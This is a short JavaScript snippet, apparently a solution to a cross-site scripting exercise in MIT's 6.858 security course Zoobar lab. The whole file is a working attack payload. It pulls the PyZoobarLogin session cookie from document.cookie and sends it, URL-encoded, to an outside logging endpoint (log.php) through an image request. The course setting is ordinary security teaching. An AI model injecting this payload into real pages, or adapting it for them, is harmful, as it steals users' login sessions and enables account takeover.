var url = 'https://css.csail.mit.edu/6.858/2022/labs/log.php?'
	+ 'id=friedchicken'
	+ '&payload=' 
	+ encodeURIComponent(document.cookie.split('; ').filter(
		function(r) { return r.indexOf('PyZoobarLogin=') != -1; }
	)[0])
	+ '&random='
	+ Math.random();
(new Image()).src=url;
